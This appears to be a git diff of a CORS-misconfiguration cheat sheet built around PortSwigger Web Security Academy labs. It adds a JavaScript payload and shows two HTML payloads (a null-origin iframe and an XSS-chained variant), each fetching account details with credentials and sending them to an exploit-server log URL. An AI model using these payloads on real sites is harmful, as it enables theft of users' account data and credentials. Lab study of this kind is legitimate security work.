@@ -50,6 +50,19 @@ A wildcard (`*`) can be used, but this is often insecure as it allows any domain
 
 - **Preflight Requests:** For requests that can modify data (e.g., `PUT`, `DELETE`) or use certain headers, the browser first sends a "preflight" request using the `OPTIONS` method. This request checks if the server understands and approves the actual request. If the server responds favorably to the `OPTIONS` request, the browser then sends the actual request.
 
+Payload for basic arbitrary origin reflected:
+
+```javascript
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://0a6300590490f183806703ee00fc00ea.web-security-academy.net/accountDetails',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location='//exploit-0a6500ab0499f17080cb0247015a00ab.exploit-server.net/log?key='+this.responseText; 
+};
+```
 ## Parsing Errors
 
 Be sure to check for errors in `Origin` header parsing.
@@ -78,7 +91,7 @@ The specification for the Origin header supports the value `null`. Browsers mig
 
 Sample payload for `NULL` origin:
 
-```
+```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
@@ -98,7 +111,7 @@ If the vulnerable site trusts an origin that is vulnerable to XSS, then the atta
 
 Example payload when there's an XSS on a trusted site:
 
-```
+```html
 <script>
 document.location="http://stock.0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ac4000c033411d480bf1bcb01920034.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
